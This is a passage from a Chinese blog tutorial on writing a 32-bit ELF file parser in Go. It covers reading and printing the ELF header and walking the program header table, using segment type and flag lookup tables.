align="center">0x0</td></tr></tbody></table><p>e_type的二进制数据即为<code>02 00</code>因为是小端存储应该变为0002也就是2，所以也就是<code>Executable</code></p><p>以此类推即可</p><h4 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h4><p>这里需要注意因为如果是小端序存储的话，需要转变为大端序才是一般常用的显示格式，所以我引入了<strong>LSBtoMSB</strong>函数，一些更具体的代码可以查看项目</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(Ehdr Elf32_Ehdr)</span> <span class="title">ReadHeader</span><span class="params">(data []<span class="keyword">byte</span>)</span> <span class="title">Elf32_Ehdr</span></span>&#123;</span><br><span class="line">Ehdr = Ehdr.ReadMagic(data)</span><br><span class="line"><span class="comment">//e_type</span></span><br><span class="line">tmp := data[<span class="number">16</span>:<span class="number">18</span>]</span><br><span class="line">tmp = Change.LSBtoMSB(tmp)</span><br><span class="line">Ehdr.e_type = Elf32_Half(Change.BytesToInt16(tmp))</span><br><span class="line"><span class="comment">//e_machine</span></span><br><span class="line">tmp = data[<span class="number">18</span>:<span class="number">20</span>]</span><br><span class="line">tmp = Change.LSBtoMSB(tmp)</span><br><span class="line">Ehdr.e_machine = Elf32_Half(Change.BytesToInt16(tmp))</span><br><span class="line"><span class="comment">//e_version</span></span><br><span class="line">tmp = data[<span class="number">20</span>:<span class="number">24</span>]</span><br><span class="line">tmp = Change.LSBtoMSB(tmp)</span><br><span class="line">Ehdr.e_version = Elf32_Word(<span class="number">1</span>)</span><br><span class="line"><span class="comment">//e_entry</span></span><br><span class="line">tmp = data[<span class="number">24</span>:<span class="number">28</span>]</span><br><span class="line">tmp = Change.LSBtoMSB(tmp)</span><br><span class="line">Ehdr.e_entry = Elf32_Addr(Change.BytesToInt32(tmp))</span><br><span class="line"><span class="comment">//e_phoff</span></span><br><span class="line">tmp = data[<span class="number">28</span>:<span class="number">32</span>]</span><br><span class="line">tmp = Change.LSBtoMSB(tmp)</span><br><span class="line">Ehdr.e_phoff = Elf32_Off(Change.BytesToInt32(tmp))</span><br><span class="line"><span class="comment">//e_shoff</span></span><br><span class="line">tmp = data[<span class="number">32</span>:<span class="number">36</span>]</span><br><span class="line">tmp = Change.LSBtoMSB(tmp)</span><br><span class="line">Ehdr.e_shoff = Elf32_Off(Change.BytesToInt32(tmp))</span><br><span class="line"><span class="comment">//e_flags</span></span><br><span class="line">tmp = data[<span class="number">36</span>:<span class="number">40</span>]</span><br><span class="line">tmp = Change.LSBtoMSB(tmp)</span><br><span class="line">Ehdr.e_flags = Elf32_Word(Change.BytesToInt32(tmp))</span><br><span class="line"><span class="comment">//e_ehsize</span></span><br><span class="line">tmp = data[<span class="number">40</span>:<span class="number">42</span>]</span><br><span class="line">tmp = Change.LSBtoMSB(tmp)</span><br><span class="line">Ehdr.e_ehsize = Elf32_Half(Change.BytesToInt16(tmp))</span><br><span class="line"><span class="comment">//e_phentsize</span></span><br><span class="line">tmp = data[<span class="number">42</span>:<span class="number">44</span>]</span><br><span class="line">tmp = Change.LSBtoMSB(tmp)</span><br><span class="line">Ehdr.e_phentsize = Elf32_Half(Change.BytesToInt16(tmp))</span><br><span class="line"><span class="comment">//e_phnum</span></span><br><span class="line">tmp = data[<span class="number">44</span>:<span class="number">46</span>]</span><br><span class="line">tmp = Change.LSBtoMSB(tmp)</span><br><span class="line">Ehdr.e_phnum = Elf32_Half(Change.BytesToInt16(tmp))</span><br><span class="line"><span class="comment">//e_shentsize</span></span><br><span class="line">tmp = data[<span class="number">46</span>:<span class="number">48</span>]</span><br><span class="line">tmp = Change.LSBtoMSB(tmp)</span><br><span class="line">Ehdr.e_shentsize = Elf32_Half(Change.BytesToInt16(tmp))</span><br><span class="line"><span class="comment">//e_shnum</span></span><br><span class="line">tmp = data[<span class="number">48</span>:<span class="number">50</span>]</span><br><span class="line">tmp = Change.LSBtoMSB(tmp)</span><br><span class="line">Ehdr.e_shnum = Elf32_Half(Change.BytesToInt16(tmp))</span><br><span class="line"><span class="comment">//e_shstrndx</span></span><br><span class="line">tmp = data[<span class="number">50</span>:<span class="number">52</span>]</span><br><span class="line">tmp = Change.LSBtoMSB(tmp)</span><br><span class="line">Ehdr.e_shstrndx = Elf32_Half(Change.BytesToInt16(tmp))</span><br><span class="line"><span class="keyword">return</span> Ehdr</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="输出ELF-Header"><a href="#输出ELF-Header" class="headerlink" title="输出ELF Header"></a>输出ELF Header</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(Ehdr Elf32_Ehdr)</span> <span class="title">PHeader</span><span class="params">()</span></span>&#123;</span><br><span class="line">fmt.Println(<span class="string">"ELF Header:"</span>)</span><br><span class="line">fmt.Printf(<span class="string">"%-9s"</span>,<span class="string">"Magic: "</span>)</span><br><span class="line">fmt.Println(Ehdr.Ehdr_Magic)</span><br><span class="line"><span class="comment">//Class</span></span><br><span class="line">fmt.Printf(<span class="string">"%-35s"</span>,<span class="string">"Class: "</span>)</span><br><span class="line">tmpstr := EhdrClass[Ehdr.Ehdr_Class]</span><br><span class="line"><span class="keyword">if</span> tmpstr == <span class="string">""</span>&#123;</span><br><span class="line">fmt.Println(<span class="string">"Invalid class"</span>)</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">fmt.Println(tmpstr)</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//Data</span></span><br><span class="line">fmt.Printf(<span class="string">"%-35s"</span>,<span class="string">"Data: "</span>)</span><br><span class="line">tmpstr = EhdrData[Ehdr.Ehdr_Data]</span><br><span class="line"><span class="keyword">if</span> tmpstr == <span class="string">""</span>&#123;</span><br><span class="line">fmt.Println(<span class="string">"Invaild data encoding"</span>)</span><br><span class="line">&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">fmt.Println(tmpstr)</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//Version</span></span><br><span class="line">fmt.Printf(<span class="string">"%-35s"</span>,<span class="string">"Version: "</span>)</span><br><span class="line">tmpstr = EhdrVersion[Ehdr.Ehdr_Version]</span><br><span class="line"><span class="keyword">if</span> tmpstr == <span class="string">""</span>&#123;</span><br><span class="line">fmt.Println(<span class="string">"Invaild version"</span>)</span><br><span class="line">&#125; <span class="keyword">else</span>&#123;</span><br><span class="line">fmt.Println(tmpstr)</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//OS/ABI</span></span><br><span class="line">fmt.Printf(<span class="string">"%-35s"</span>,<span class="string">"OS/ABI: "</span>)</span><br><span class="line">tmpstr = EhdrOSABI[Ehdr.Ehdr_OS]</span><br><span class="line"><span class="keyword">if</span> tmpstr == <span class="string">""</span>&#123;</span><br><span class="line">fmt.Println(<span class="string">"Unknown"</span>)</span><br><span class="line">&#125; <span class="keyword">else</span>&#123;</span><br><span class="line">fmt.Println(tmpstr)</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//ABI Version</span></span><br><span class="line">fmt.Printf(<span class="string">"%-35s"</span>,<span class="string">"ABI Version:"</span>)</span><br><span class="line">fmt.Println(<span class="keyword">int64</span>(Ehdr.Ehdr_ABIV))</span><br><span class="line"><span class="comment">//Type</span></span><br><span class="line">fmt.Printf(<span class="string">"%-35s"</span>,<span class="string">"Type: "</span>)</span><br><span class="line">tmpstr = EhdrType[<span class="keyword">int</span>(<span class="keyword">int32</span>(Ehdr.e_type))]</span><br><span class="line"><span class="keyword">if</span> tmpstr == <span class="string">""</span>&#123;</span><br><span class="line">fmt.Println(<span class="string">"Unknown"</span> )</span><br><span class="line">&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">fmt.Println(tmpstr )</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//Machine</span></span><br><span class="line">fmt.Printf(<span class="string">"%-35s"</span>,<span class="string">"Machine: "</span>)</span><br><span class="line">tmpstr = EhdrMachine[<span class="keyword">int</span>(<span class="keyword">int32</span>(Ehdr.e_machine))]</span><br><span class="line"><span class="keyword">if</span> tmpstr == <span class="string">""</span>&#123;</span><br><span class="line">fmt.Println(<span class="string">"Unknown"</span> )</span><br><span class="line">&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">fmt.Println(tmpstr)</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//Version</span></span><br><span class="line">fmt.Printf(<span class="string">"%-35s"</span>,<span class="string">"Version:"</span>)</span><br><span class="line">fmt.Println(<span class="string">"0x"</span>+Change.DecHex(<span class="keyword">int64</span>(Ehdr.e_version)))</span><br><span class="line"><span class="comment">//Entry point address</span></span><br><span class="line">fmt.Printf(<span class="string">"%-35s"</span>,<span class="string">"Entry point address:"</span>)</span><br><span class="line">fmt.Println(<span class="string">"0x"</span>+Change.DecHex(<span class="keyword">int64</span>(Ehdr.e_entry)))</span><br><span class="line"><span class="comment">//Start of program headers</span></span><br><span class="line">fmt.Printf(<span class="string">"%-35s"</span>,<span class="string">"Start of program headers:"</span>)</span><br><span class="line">fmt.Println(<span class="keyword">int64</span>(Ehdr.e_phoff),<span class="string">"(bytes into file)"</span>)</span><br><span class="line"><span class="comment">//Start of section headers</span></span><br><span class="line">fmt.Printf(<span class="string">"%-35s"</span>,<span class="string">"Start of section headers:"</span>)</span><br><span class="line">fmt.Println(<span class="keyword">int64</span>(Ehdr.e_shoff),<span class="string">"(bytes into file)"</span>)</span><br><span class="line"><span class="comment">//Flags</span></span><br><span class="line">fmt.Printf(<span class="string">"%-35s"</span>,<span class="string">"FLags:"</span>)</span><br><span class="line">fmt.Println(<span class="string">"0x"</span>+Change.DecHex(<span class="keyword">int64</span>(Ehdr.e_flags)))</span><br><span class="line"><span class="comment">//Size of this header</span></span><br><span class="line">fmt.Printf(<span class="string">"%-35s"</span>,<span class="string">"Size of this header:"</span>)</span><br><span class="line">fmt.Println(<span class="keyword">int64</span>(Ehdr.e_ehsize),<span class="string">"(bytes)"</span>)</span><br><span class="line"><span class="comment">//Size of program headers</span></span><br><span class="line">fmt.Printf(<span class="string">"%-35s"</span>,<span class="string">"Size of program headers:"</span>)</span><br><span class="line">fmt.Println(<span class="keyword">int64</span>(Ehdr.e_phentsize),<span class="string">"(bytes)"</span>)</span><br><span class="line"><span class="comment">//Number of program headers</span></span><br><span class="line">fmt.Printf(<span class="string">"%-35s"</span>,<span class="string">"Number of program headers:"</span>)</span><br><span class="line">fmt.Println(<span class="keyword">int64</span>(Ehdr.e_phnum))</span><br><span class="line"><span class="comment">//Size of section headers</span></span><br><span class="line">fmt.Printf(<span class="string">"%-35s"</span>,<span class="string">"Size of section headers:"</span>)</span><br><span class="line">fmt.Println(<span class="keyword">int64</span>(Ehdr.e_shentsize),<span class="string">"(bytes)"</span>)</span><br><span class="line"><span class="comment">//Number of section headers</span></span><br><span class="line">fmt.Printf(<span class="string">"%-35s"</span>,<span class="string">"Number of section headers:"</span>)</span><br><span class="line">fmt.Println(<span class="keyword">int64</span>(Ehdr.e_shnum))</span><br><span class="line"><span class="comment">//Section header string table index</span></span><br><span class="line">fmt.Printf(<span class="string">"%-35s"</span>,<span class="string">"Section header string table index:"</span>)</span><br><span class="line">fmt.Println(<span class="keyword">int64</span>(Ehdr.e_shstrndx))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Program-Header-Table"><a href="#Program-Header-Table" class="headerlink" title="Program Header Table"></a>Program Header Table</h2><h3 id="概述-2"><a href="#概述-2" class="headerlink" title="概述"></a>概述</h3><p>首先我们得先熟悉并且理解Program Header Table的结构体定义开始：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> Elf32_phdr <span class="keyword">struct</span> &#123;</span><br><span class="line">p_type Elf32_Word</span><br><span class="line"><span class="comment">//此数组元素描述的段的类型，或者如何解释此数组元素的信息</span></span><br><span class="line">p_offset Elf32_Off</span><br><span class="line"><span class="comment">//此成员给出从文件头到该段第一个字节的偏移</span></span><br><span class="line">p_vaddr Elf32_Addr</span><br><span class="line"><span class="comment">//此成员给出段的第一个字节将被放到内存中的虚拟地址</span></span><br><span class="line">p_paddr Elf32_Addr</span><br><span class="line"><span class="comment">//此成员仅用于与物理地址相关的系统中。System V忽略所有应用程序的物理地址信息</span></span><br><span class="line">p_filesz Elf32_Word</span><br><span class="line"><span class="comment">//此成员给出段在文件映像中所占的字节数。可以为0</span></span><br><span class="line">p_memsz Elf32_Word</span><br><span class="line"><span class="comment">//此成员给出段在内存映像中占用的字节数。可以为0</span></span><br><span class="line">p_flage Elf32_Word</span><br><span class="line"><span class="comment">//此成员给出与段相关的标志(read、write、exec)</span></span><br><span class="line">p_align Elf32_Word</span><br><span class="line"><span class="comment">//此成员给出段在文件中和内存中如何对齐</span></span><br><span class="line"><span class="comment">//字节对其,p_vaddr 和 p_offset 对 p_align 取模后应该等于0</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>下面开始逐步解释各个字段</p><h4 id="p-type"><a href="#p-type" class="headerlink" title="p_type"></a>p_type</h4><p>声明此段的作用类型</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">PType := <span class="keyword">map</span>[<span class="keyword">int</span>]<span class="keyword">string</span>&#123;</span><br><span class="line"><span class="number">0x0</span>:<span class="string">"NULL"</span>,</span><br><span class="line"><span class="number">0x1</span>:<span class="string">"LOAD"</span>,</span><br><span class="line"><span class="number">0x2</span>:<span class="string">"DYNAMIC"</span>,</span><br><span class="line"><span class="number">0x3</span>:<span class="string">"INERP"</span>,</span><br><span class="line"><span class="number">0x4</span>:<span class="string">"NOTE"</span>,</span><br><span class="line"><span class="number">0x5</span>:<span class="string">"SHLIB"</span>,</span><br><span class="line"><span class="number">0x6</span>:<span class="string">"PHDR"</span>,</span><br><span class="line"><span class="number">0x7</span>:<span class="string">"TLS"</span>,</span><br><span class="line"><span class="number">0x8</span>:<span class="string">"NUM"</span>,</span><br><span class="line"><span class="number">0x60000000</span>:<span class="string">"LOOS"</span>,</span><br><span class="line"><span class="number">0x6474e550</span>:<span class="string">"GNU_EH_FRAME"</span>,</span><br><span class="line"><span class="number">0x6474e551</span>:<span class="string">"GNU_STACK"</span>,</span><br><span class="line"><span class="number">0x6474e552</span>:<span class="string">"GNU_RELRO"</span>,</span><br><span class="line"><span class="number">0x6ffffffa</span>:<span class="string">"LOSUNW"</span>,</span><br><span class="line"><span class="number">0x6ffffffc</span>:<span class="string">"SUNWBSS"</span>,</span><br><span class="line"><span class="number">0x6ffffffb</span>:<span class="string">"SUNWSTACK"</span>,</span><br><span class="line"><span class="number">0x6fffffff</span>:<span class="string">"HISUNW "</span>,</span><br><span class="line"><span class="number">0x6ffffffe</span>:<span class="string">"HIOS"</span>,</span><br><span class="line"><span class="number">0x70000000</span>:<span class="string">"LOPROC"</span>,</span><br><span class="line"><span class="number">0x7fffffff</span>:<span class="string">"HIPROC"</span>,</span><br><span class="line"><span class="comment">// ARM Sections</span></span><br><span class="line"><span class="number">0x70000001</span>:<span class="string">"ARM_EXIDX"</span>,</span><br><span class="line"><span class="number">0x70000002</span>:<span class="string">"ARM_PREEMPTMAP"</span>,</span><br><span class="line"><span class="number">0x70000003</span>:<span class="string">"ARM_ATTRIBUTES"</span>,</span><br><span class="line"><span class="number">0x70000004</span>:<span class="string">"ARM_DEBUGOVERLAY"</span>,</span><br><span class="line"><span class="number">0x70000005</span>:<span class="string">"ARM_OVERLAYSECTION"</span>,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="p-offset"><a href="#p-offset" class="headerlink" title="p_offset"></a>p_offset</h4><p>段相对于文件的索引地址</p><h4 id="p-vaddr"><a href="#p-vaddr" class="headerlink" title="p_vaddr"></a>p_vaddr</h4><p>段在内存中的虚拟地址</p><h4 id="p-paddr"><a href="#p-paddr" class="headerlink" title="p_paddr"></a>p_paddr</h4><p>段的物理地址</p><h4 id="p-filesz"><a href="#p-filesz" class="headerlink" title="p_filesz"></a>p_filesz</h4><p>段在文件中所占的长度</p><h4 id="p-memsz"><a href="#p-memsz" class="headerlink" title="p_memsz"></a>p_memsz</h4><p>段在内存中所占的长度</p><h4 id="p-flage"><a href="#p-flage" class="headerlink" title="p_flage"></a>p_flage</h4><p>段相关标志(read、write、exec)</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">PFlag := <span class="keyword">map</span>[<span class="keyword">int</span>]<span class="keyword">string</span>&#123;</span><br><span class="line"><span class="number">0</span>:<span class="string">"N"</span>,</span><br><span class="line"><span class="number">1</span>:<span class="string">"__E"</span>,</span><br><span class="line"><span class="number">2</span>:<span class="string">"_W_"</span>,</span><br><span class="line"><span class="number">3</span>:<span class="string">"_WE"</span>,</span><br><span class="line"><span class="number">4</span>:<span class="string">"R__"</span>,</span><br><span class="line"><span class="number">5</span>:<span class="string">"R_E"</span>,</span><br><span class="line"><span class="number">6</span>:<span class="string">"RW_"</span>,</span><br><span class="line"><span class="number">7</span>:<span class="string">"RWE"</span>,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="p-align"><a href="#p-align" class="headerlink" title="p_align"></a>p_align</h4><p>给出段在文件中和内存中如何对齐</p><h3 id="读取Program-Header-Table"><a href="#读取Program-Header-Table" class="headerlink" title="读取Program Header Table"></a>读取Program Header Table</h3><p>这里的一个关键是如果从文件中读取出Program Header Table的数据，在ELF_Header中,我们可以得到Program Header的<strong>索引地址(e_phoff)</strong>、<strong>段数量(e_phnum)</strong>、<strong>表项大小(e_phentsize)</strong></p><p>那我们可以知道Program Header Table的数据起始地址Star_Addr，结束地址End_Addr：</p><ul><li>Star_Addr = e_phoff</li><li>End_Addr = e_phoff + e_phnum*e_phentsize</li></ul><p>获取到数据后，就需要一个个去读取每一个Program Header</p><p>转变为代码即为：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(phdr Elf32_phdr)</span> <span class="title">MainRead</span><span class="params">(Ehdr Elf32_Ehdr,data []<span class="keyword">byte</span>)</span></span>&#123;</span><br><span class="line"><span class="keyword">var</span> Phnum <span class="keyword">int64</span> = <span class="keyword">int64</span>(Ehdr.e_phnum) <span class="comment">//获取Program Header数量</span></span><br><span class="line"><span class="keyword">var</span> StartIndex <span class="keyword">int64</span>= <span class="keyword">int64</span>(Ehdr.e_phoff)</span><br><span class="line"><span class="keyword">for</span> i:=<span class="number">0</span>;i&lt;<span class="keyword">int</span>(Phnum);i++ &#123;</span><br><span class="line">phdr.SonRead(StartIndex,data,<span class="keyword">int64</span>(Ehdr.e_phentsize))</span><br><span class="line">StartIndex = StartIndex + <span class="keyword">int64</span>(Ehdr.e_phentsize)</span><br><span class="line">&#125;</span><br><span class="line">fmt.Println(<span class="string">""</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(phdr Elf32_phdr)</span> <span class="title">SonRead</span><span class="params">(StartIndex <span class="keyword">int64</span>,data []<span class="keyword">byte</span>,size <span class="keyword">int64</span>)</span></span>&#123;</span><br><span class="line"><span class="keyword">var</span> t_phdr Elf32_phdr</span><br><span class="line"><span class="keyword">var</span> t_data []<span class="keyword">byte</span> = data[StartIndex:StartIndex+size]</span><br><span class="line"><span class="comment">//p_type Elf32_Word</span></span><br><span class="line">tmp := t_data[:<span class="number">4</span>]</span><br><span class="line">tmp = Change.LSBtoMSB(tmp)</span><br><span class="line">t_phdr.p_type = Elf32_Word(Change.BytesToInt32(tmp))</span><br><span class="line"><span class="comment">//p_offset Elf32_Off</span></span><br><span class="line">tmp = t_data[<span class="number">4</span>:<span class="number">8</span>]</span><br><span class="line">tmp = Change.LSBtoMSB(tmp)</span><br><span class="line">t_phdr.p_offset = Elf32_Off(Change.BytesToInt32(tmp))</span><br><span class="line"><span class="comment">//p_vaddr Elf32_Addr</span></span><br><span class="line">tmp = t_data[<span class="number">8</span>:<span class="number">12</span>]</span><br><span class="line">tmp = Change.LSBtoMSB(tmp)</span><br><span class="line">t_phdr.p_vaddr = Elf32_Addr(Change.BytesToInt32(tmp))</span><br><span class="line"><span class="comment">//p_paddr Elf32_Addr</span></span><br><span class="line">tmp = t_data[<span class="number">12</span>:<span class="number">16</span>]</span><br><span class="line">tmp = Change.LSBtoMSB(tmp)</span><br><span class="line">t_phdr.p_paddr = Elf32_Addr(Change.BytesToInt32(tmp))</span><br><span class="line"><span class="comment">//p_filesz Elf32_Word</span></span><br><span class="line">tmp = t_data[<span class="number">16</span>:<span class="number">20</span>]</span><br><span class="line">tmp = Change.LSBtoMSB(tmp)</span><br><span class="line">t_phdr.p_filesz = Elf32_Word(Change.BytesToInt32(tmp))</span><br><span class="line"><span class="comment">//p_memsz Elf32_Word</span></span><br><span class="line">tmp = t_data[<span class="number">20</span>:<span class="number">24</span>]</span><br><span class="line">tmp = Change.LSBtoMSB(tmp)</span><br><span class="line">t_phdr.p_memsz = Elf32_Word(Change.BytesToInt32(tmp))</span><br><span class="line"><span class="comment">//p_flage Elf32_Word</span></span><br><span class="line">tmp = t_data[<span class="number">24</span>:<span class="number">28</span>]</span><br><span class="line">tmp = Change.LSBtoMSB(tmp)</span><br><span class="line">t_phdr.p_flage = Elf32_Word(Change.BytesToInt32(tmp))</span><br><span class="line"><span class="comment">//p_align Elf32_Word</span></span><br><span class="line">tmp = t_data[<span class="number">28</span>:<span class="number">32</span>]</span><br><span class="line">tmp = Change.LSBtoMSB(tmp)</span><br><span class="line">t_phdr.p_align = Elf32_Word(Change.BytesToInt32(tmp))</span><br><span class="line"><span class="comment">//p_type</span></span><br><span class="line">tmpstr := PType[<span class="keyword">int</span>(<span class="keyword">int32</span>(t_phdr.p_type))]</span><br><span class="line"><span class="keyword">if</span> tmpstr ==<span class="string">""</span>&#123;</span><br><span class="line">fmt.Printf(<span class="string">"%-13s"</span>,<span class="string">"Unknown"</span>)</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">fmt.Printf(<span class="string">"%-13s"</span>,tmpstr)</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//p_offset</span></span><br><span class="line">fmt.Print(<span class="string">"  "</span>)</span><br><span class="line">tstr := <span class="string">"0x"</span>+Change.DecHex(<span class="keyword">int64</span>(t_phdr.p_offset))</span><br><span class="line">fmt.Printf(<span class="string">"%-9s"</span>,tstr)</span><br><span class="line"><span class="comment">//p_vaddr</span></span><br><span class="line">tstr = <span class="string">"0x"</span>+Change.DecHex(<span class="keyword">int64</span>(t_phdr.p_vaddr))</span><br><span class="line">fmt.Printf(<span class="string">"%-11s"</span>,tstr)</span><br><span class="line"><span class="comment">//p_paddr</span></span><br><span class="line">tstr = <span class="string">"0x"</span>+Change.DecHex(<span class="keyword">int64</span>(t_phdr.p_paddr))</span><br><span class="line">fmt.Printf(<span class="string">"%-11s"</span>,tstr)</span><br><span class="line"><span class="comment">//p_filesz</span></span><br><span class="line">tstr = <span class="string">"0x"</span>+Change.DecHex(<span class="keyword">int64</span>(t_phdr.p_filesz))</span><br><span class="line">fmt.Printf(<span class="string">"%-8s"</span>,tstr)</span><br><span class="line"><span class="comment">//p_memsz</span></span><br><span class="line">tstr = <span class="string">"0x"</span>+Change.DecHex(<span class="keyword">int64</span>(t_phdr.p_memsz))</span><br><span class="line">fmt.Printf(<span 